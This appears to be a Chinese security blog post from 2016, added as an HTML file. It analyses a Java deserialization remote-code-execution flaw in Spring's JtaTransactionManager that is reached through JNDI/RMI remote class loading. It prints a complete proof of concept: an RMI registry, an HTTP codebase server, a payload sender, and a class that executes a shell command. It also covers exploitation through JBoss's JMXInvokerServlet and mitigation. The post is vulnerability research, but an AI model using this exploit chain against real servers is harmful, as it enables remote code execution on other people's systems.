@@ -1,0 +1,650 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>Spring framework deserialization RCE漏洞分析以及利用 | 随风&#39;S Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="iswin">
+    
+
+    
+    <meta name="description" content="11月初爆发的JAVA反序列漏洞已经过去几个月了，各大安全研究人员对该漏洞的利用技巧也是五花八门，JAVA反序列化漏洞的爆发引起了很多漏洞研究者的注意，国外安全研究人员（zerothoughts）最近在Spring框架中同样也发现关于序列化的一些问题，本文主要是讨论在Spring框架中序列化漏洞成因以及一些利用方式。  漏洞原理分析上一次的漏洞成因是Apache CommonsCollectio">
+<meta name="keywords" content="Deserialize,JAVA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring framework deserialization RCE漏洞分析以及利用">
+<meta property="og:url" content="https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-分析以及利用/index.html">
+<meta property="og:site_name" content="随风&#39;S Blog">
+<meta property="og:description" content="11月初爆发的JAVA反序列漏洞已经过去几个月了，各大安全研究人员对该漏洞的利用技巧也是五花八门，JAVA反序列化漏洞的爆发引起了很多漏洞研究者的注意，国外安全研究人员（zerothoughts）最近在Spring框架中同样也发现关于序列化的一些问题，本文主要是讨论在Spring框架中序列化漏洞成因以及一些利用方式。  漏洞原理分析上一次的漏洞成因是Apache CommonsCollectio">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://www.iswin.org/attach/jtamanager.png">
+<meta property="og:image" content="https://www.iswin.org/attach/jtamanager_B.png">
+<meta property="og:image" content="https://www.iswin.org/attach/spring%20framework%20rce%20readObject.png">
+<meta property="og:image" content="https://www.iswin.org/attach/spring%20framework%20rce%20init.png">
+<meta property="og:image" content="https://www.iswin.org/attach/spring%20framework%20rce%20lookuptransaction.png">
+<meta property="og:image" content="https://www.iswin.org/attach/spring%20framework%20rce%20lookup.png">
+<meta property="og:image" content="https://www.iswin.org/attach/poc_success.png">
+<meta property="og:image" content="https://www.iswin.org/attach/spring-jboss.png">
+<meta property="og:image" content="https://www.iswin.org/attach/Spring-jboss-success.png">
+<meta property="og:updated_time" content="2017-01-23T17:20:23.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Spring framework deserialization RCE漏洞分析以及利用">
+<meta name="twitter:description" content="11月初爆发的JAVA反序列漏洞已经过去几个月了，各大安全研究人员对该漏洞的利用技巧也是五花八门，JAVA反序列化漏洞的爆发引起了很多漏洞研究者的注意，国外安全研究人员（zerothoughts）最近在Spring框架中同样也发现关于序列化的一些问题，本文主要是讨论在Spring框架中序列化漏洞成因以及一些利用方式。  漏洞原理分析上一次的漏洞成因是Apache CommonsCollectio">
+<meta name="twitter:image" content="https://www.iswin.org/attach/jtamanager.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="随风&#39;S Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/author.jpg" alt="随风&#39;S Blog" title="随风&#39;S Blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="随风&#39;S Blog">随风&#39;S Blog</a></h1>
+				<h2 class="blog-motto">网络安全爱好者</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/atom.xml">RSS</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:www.iswin.org">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/24/Spring-framework-deserialization-RCE-分析以及利用/" title="Spring framework deserialization RCE漏洞分析以及利用" itemprop="url">Spring framework deserialization RCE漏洞分析以及利用</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="iswin" target="_blank" itemprop="author">iswin</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-24T07:28:42.000Z" itemprop="datePublished"> 发表于 2016-01-24</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理分析"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞修复"><span class="toc-number">3.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol>
+		
+		</div>
+		
+		<blockquote>
+<p>11月初爆发的JAVA反序列漏洞已经过去几个月了，各大安全研究人员对该漏洞的利用技巧也是五花八门，JAVA反序列化漏洞的爆发引起了很多漏洞研究者的注意，国外安全研究人员（<strong><strong><a href="http://zerothoughts.tumblr.com/" target="_blank" rel="noopener">zerothoughts</a></strong></strong>）最近在Spring框架中同样也发现关于序列化的一些问题，本文主要是讨论在Spring框架中序列化漏洞成因以及一些利用方式。</p>
+</blockquote>
+<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>上一次的漏洞成因是Apache CommonsCollection组建中对集合的操作存在可以进行反射调用的方法，但是这次Spring框架的RCE基本上和CommonsCollection组建没有什么关系，在分析漏洞之前我们先来回顾下序列化的相关知识，只有明白了序列化是怎么回事，在理解序列化漏洞时就非常简单了。</p>
+<p>关于序列化其实我们只需要知道两点即可，如下</p>
+<ul>
+<li>在对对象进行序列化时会调用<strong><strong>Java.io.ObjectOutputStream</strong></strong>对象的<strong><strong>writeObject(Object obj)</strong></strong>方法。</li>
+<li>在对象进行反序列化时会调用<strong><strong>Java.io.ObjectInputStream</strong></strong>对象的<strong><strong>readObject()</strong></strong>方法。</li>
+</ul>
+<p>明白上面两点之后，我们再来了解下JAVA体系中的RMI以及JNDI，具体如下</p>
+<ul>
+<li><p>RMI（Remote Method Invocation） 即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP（Java Remote Message Protocol，Java远程消息交换协议）以及CORBA。</p>
+</li>
+<li><p>JNDI (Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。JNDI支持的服务主要有以下几种：DNS、LDAP、 CORBA对象服务、RMI等。</p>
+</li>
+</ul>
+<p>那么RMI和JNDI有什么关系呢？简单说就是RMI注册的服务可以让JNDI应用程序来访问，关于两者的具体关系以及在应用中的使用请参考<a href="http://docs.oracle.com/javase/7/docs/technotes/guides/jndi/jndi-rmi.html" target="_blank" rel="noopener">官方文档</a>这里不赘述。</p>
+<p>在讨论Spring框架序列化漏洞之前，我们先来看看关于JNDI的RCE，如上文所述，JNDI支持很多服务类型，当服务类型为RMI协议时，如果从RMI注册服务中lookup的对象类型为<strong><strong>Reference</strong></strong>类型或者其子类时,会导致远程代码执行，Reference类提供了两个比较重要的属性，className以及codebase url，classname为远程调用引用的类名，那么codebase url决定了在进行rmi远程调用时对象的位置，此外codebase url支持http协议,当远程调用类(通过lookup来寻找)在RMI服务器中的CLASSPATH中不存在时，就会从指定的codebase url来进行类的加载，如果两者都没有，远程调用就会失败。</p>
+<p>JNDI RCE漏洞产生的原因就在于当我们在注册RMI服务时，可以指定codebase url，也就是远程要加载类的位置，设置该属性可以让JDNI应用程序在加载时加载我们指定的类( 例如：<a href="http://www.iswin.org/xx.class">http://www.iswin.org/xx.class</a>) ，这里还有一个比较重要的点，也是触发恶意代码的点，当JNDI应用程序通过lookup(rmi服务的地址)调用指定codebase url上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时，漏洞就会触发。</p>
+<p>JNDI的RCE可以用以下代码来解释</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1999</span>);</span><br><span class="line"><span class="comment">// 设置code url 这里即为http://http://127.0.0.1:8000/</span></span><br><span class="line"><span class="comment">// 最终下载恶意类的地址为http://127.0.0.1:8000/ExportObject.class</span></span><br><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">"ExportObject"</span>, <span class="string">"ExportObject"</span>, <span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line"><span class="comment">// Reference包装类</span></span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
+<p>上述代码使用了1999端口来注册了RMI服务和绑定相应的调用对象，同时指定了要远程调用类的名称 <strong><strong>ExportObject</strong></strong>，以及上文所述的codebase url 地址为<strong><strong><a href="http://127.0.0.1:8000/" target="_blank" rel="noopener">http://127.0.0.1:8000/</a></strong></strong>，也就是说当JNDI应用程序去调用RMI地址进行远程调用时，例如，调用的地址为rmi://127.0.0.1:1999/Object，当JNDI应用程序在远程调用时，会去查找Object名称绑定的类的位置，这里我们指定了类的加载位置<strong><strong><a href="http://127.0.0.1:8000/" target="_blank" rel="noopener">http://127.0.0.1:8000/</a></strong></strong>，所以最终实际加载类的地址就是<strong><strong><a href="http://127.0.0.1:8000/ExportObject.class" target="_blank" rel="noopener">http://127.0.0.1:8000/ExportObject.class</a></strong></strong>，成功加载后会进行实例化，从而调用ExportObject类的构造方法，如果我们将恶意代码放在要加载类的构造方法中，就会导致任意代码执行。</p>
+<p>如果明白上面所述的一些问题，那么接下来理解Spring框架的RCE时就非常简单了，因为Spring框架的远程代码执行的根本就是JNDI的远程代码执行，只不过需要结合序列化来触发。</p>
+<p>Spring 框架中的远程代码执行的缺陷在于spring-tx-xxx.jar中的org.springframework.transaction.jta.JtaTransactionManager类，该类实现了Java Transaction API，主要功能是处理分布式的事务管理，我们先来看看该类的方法以及成员变量。<br><img src="/attach/jtamanager.png" width="820"><br><img src="/attach/jtamanager_B.png" width="820"></p>
+<p>通过eclipse我们可以明显的看到该类实现了readObject(ObjectOutputStream)方法，为什么漏洞叫Spring框架的序列化漏洞，原因就在这里，关于反序列的只是上面已经介绍过了，我们都知道当一个类被反序列化时会调用该类的readObject方法，跟进readObject方法<br><img src="/attach/spring framework rce readObject.png" width="820"><br>方法<strong><strong>initUserTransactionAndTransactionManager();</strong></strong>是用来初始化UserTransaction以及TransactionManager，跟进该方法<br><img src="/attach/spring framework rce init.png" width="820"><br>这里我们可以看到该方法中调用了lookupUserTransaction方法，该方法的功能为</p>
+<p><strong><em>Look up the JTA UserTransaction in JNDI via the configured name.</em></strong></p>
+<p>通过配置好的transaction名称用JNDI的方式进行查找，到这里漏洞的成因就比较清晰了，这里的userTransactionName变量我们可以控制，通过setter方法可以初始化该变量，这里userTransactionName可以是rmi的调用地址(例如，userTransactionName=”rmi://127.0.0.1:1999/Object”)，只要控制userTransactionName变量，就可以触发JNDI的RCE，继续跟进lookupUserTransaction方法<br><img src="/attach/spring framework rce lookuptransaction.png" height="320" width="820"><br>最终会调用JndiTemplate的lookup方法，如下<br><img src="/attach/spring framework rce lookup.png" height="320" width="820"></p>
+<p>从而触发JNDI的RCE导致Spring framework序列化的漏洞产生。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞作者<strong><strong><a href="http://zerothoughts.tumblr.com/" target="_blank" rel="noopener">zerothoughts</a></strong></strong>在github上面已经放出了漏洞利用的POC，详情见<a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">https://github.com/zerothoughts/spring-jndi</a> </p>
+<p>首先看看对于该漏洞，我们可以控制的地方，如下</p>
+<ol>
+<li>userTransactionName，可以指定为攻击者自己注册的RMI服务。</li>
+<li>codebase url，远程调用类的路径（攻击者可控）</li>
+<li>JtaTransactionManager类中的readObject方法在反序列化事触发了JNDI的RCE。</li>
+</ol>
+<p>结合上面3个条件，就可以成功触发Spring framework 序列化的漏洞。</p>
+<p>我修改了下作者给出的POC，看起来更加清晰点，POC分为两部分，客户端和服务端，服务端只是模拟了反序列的功能。</p>
+<p>客户端如下如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin@iswin.org</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 2016.1.24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"restriction"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringPOC</span> </span>&#123;</span><br><span class="line">	<span class="comment">/***</span></span><br><span class="line"><span class="comment">	 * 启动http服务器，提供下载远程要调用的类</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lanuchCodebaseURLServer</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">		HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8000</span>), <span class="number">0</span>);</span><br><span class="line">		httpServer.createContext(<span class="string">"/"</span>, <span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">		httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">		httpServer.start();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/***</span></span><br><span class="line"><span class="comment">	 * 启动RMI服务</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lanuchRMIregister</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">		Registry registry = LocateRegistry.createRegistry(<span class="number">1999</span>);</span><br><span class="line">		<span class="comment">// 设置code url 这里即为http://http://127.0.0.1:8000/</span></span><br><span class="line">		<span class="comment">// 最终下载恶意类的地址为http://127.0.0.1:8000/ExportObject.class</span></span><br><span class="line">		Reference reference = <span class="keyword">new</span> Reference(<span class="string">"ExportObject"</span>, <span class="string">"ExportObject"</span>, <span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">		<span class="comment">// Reference包装类</span></span><br><span class="line">		ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">		registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/***</span></span><br><span class="line"><span class="comment">	 * 发送payload</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sendPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">// jndi的调用地址</span></span><br><span class="line">		String jndiAddress = <span class="string">"rmi://127.0.0.1:1999/Object"</span>;</span><br><span class="line">		<span class="comment">// 实例化JtaTransactionManager对象，并且初始化UserTransactionName成员变量</span></span><br><span class="line">		JtaTransactionManager object = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">		object.setUserTransactionName(jndiAddress);</span><br><span class="line">		<span class="comment">// 发送构造好的payload</span></span><br><span class="line">		Socket socket = <span class="keyword">new</span> Socket(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">		System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">		ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">		objectOutputStream.writeObject(object);</span><br><span class="line">		objectOutputStream.flush();</span><br><span class="line">		socket.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		lanuchCodebaseURLServer();</span><br><span class="line">		lanuchRMIregister();</span><br><span class="line">		sendPayload();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>服务端如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(Integer.parseInt(args[<span class="number">0</span>]));</span><br><span class="line">			System.out.println(<span class="string">"Server started on port "</span>+serverSocket.getLocalPort());</span><br><span class="line">			<span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">				Socket socket=serverSocket.accept();</span><br><span class="line">				System.out.println(<span class="string">"Connection received from "</span>+socket.getInetAddress());				</span><br><span class="line">				ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					Object object = objectInputStream.readObject();</span><br><span class="line">					System.out.println(<span class="string">"Read object "</span>+object);									</span><br><span class="line">				&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">					System.out.println(<span class="string">"Exception caught while reading object"</span>);									</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;				</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发送的PayLoad为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportObject</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String sb = <span class="string">""</span>;</span><br><span class="line">		BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">		BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">		String lineStr;</span><br><span class="line">		<span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="keyword">null</span>)</span><br><span class="line">			sb += lineStr + <span class="string">"\n"</span>;</span><br><span class="line">		inBr.close();</span><br><span class="line">		in.close();</span><br><span class="line">		<span class="keyword">return</span> sb;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ExportObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String cmd=<span class="string">"/sbin/ifconfig"</span>;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> Exception(exec(cmd));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行成功后的效果为<br><img src="/attach/poc_success.png" width="820"></p>
+<p>上面是作者给出的POC，已经能证明在Spring框架中的确存在缺陷的类。不过这只是模拟了漏洞的触发过程，那么在实际利用过程中又会是怎么样的，下面将具体进行分析。</p>
+<p>这里重点还是说下该漏洞在中间件中的利用，依然以JBOSS为例子(电脑上只有它)，其它中间件类比下就知道了。上面对漏洞的产生的原因以及触发条件作了详细的说明，很多人问，这个不是Spring framework的漏洞么，是不是只要使用了Spring框架进行开发就可能会受影响，非常遗憾的告诉大家那是不可以的。</p>
+<p>要想成功利用该漏洞，必须满足下列条件</p>
+<ol>
+<li>存在接口可以进行对象反序列化</li>
+<li>访问对象可以出网，因为要进行远程类下载(内网中另作讨论)</li>
+<li>目标对象中的CLASSPATH中存在Spring-tx-xx.jar有缺陷类的jar包</li>
+</ol>
+<p>当上述3个条件同时满足时，才能触发该漏洞，这里主要讨论在中间件中的利用，所以条件1很好满足(例如JBOSS、Weblogic、Jenkins、Websphere等)，条件2也可以满足，但是条件3却比较苛刻，由于Spring-tx-xx.jar文件不是中间件的默认组件，所以，该漏洞就比较鸡肋，对于中间件来说，每个应用的lib库文件的类加载器是不一样的，换句话说，就是在同一中间件中，A应用的lib库文件B应用是无法使用的，所以即使目标应用存在该缺陷，那么中间件的漏洞触发点是无法找到缺陷应用lib文件中的class文件的，所以无法做到通用的利用，说白了就是lib库共享的问题，那么在实际工程中可能会存在将缺陷jar文件放在中间件的类加载器中的情况，比如说所有的项目都会用到spring的jar，开发人员索性就把jar文件给共享了，这样所有的应用都可以访问到该jar文件，这种情况下漏洞是可以完全触发的。</p>
+<p>这里我以JBOSS中间件为例子，进行说明，在jboss中jboss-5.0.1.GA\lib*.jar 所有的jar，所有的应用都是可以访问的，将有缺陷的类放在这个目录下就会触发漏洞，因为Jboss序列化触发的点在<strong><em>/invoker/JMXInvokerServlet</em></strong>上，所以我将受缺陷的文件放在了该应用的lib目录下，如下图所示<br><img src="/attach/spring-jboss.png" width="820"></p>
+<p>修改POC后，成功利用该漏洞<br><img src="/attach/Spring-jboss-success.png" width="820"></p>
+<p>总之，如果要成功利用，得看人品。其它中间我想应该也是一样的，如果有什么问题，欢迎指正。</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>通过Spring官方给作者的邮件中，可以看出官方将这个锅丢给了中间件反序列接口的防范上或者可以进行反序列的方法上。如果觉得有必要修复漏洞的小伙伴，可以重写JtaTransactionManager类中的readObject方法禁用相关功能就行了。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] :<a href="http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection" target="_blank" rel="noopener">http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection</a><br>[2] :<a href="http://zerothoughts.tumblr.com/post/137831000514/spring-framework-deserialization-rce" target="_blank" rel="noopener">http://zerothoughts.tumblr.com/post/137831000514/spring-framework-deserialization-rce</a><br>[3] :<a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">https://github.com/zerothoughts/spring-jndi</a></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/JAVA/">JAVA</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/Deserialize/">Deserialize</a><a href="/tags/JAVA/">JAVA</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-分析以及利用/" data-title="Spring framework deserialization RCE漏洞分析以及利用 | 随风&#39;S Blog" data-tsina="null" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2016/02/27/Xstream-Deserializable-Vulnerablity-And-Groovy-CVE-2015-3253/" title="XStream Deserializable Vulnerablity And Groovy CVE-2015-3253漏洞分析">
+  <strong>上一篇：</strong><br/>
+  <span>
+  XStream Deserializable Vulnerablity And Groovy CVE-2015-3253漏洞分析</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/"  title="JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用">
+ <strong>下一篇：</strong><br/> 
+ <span>JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
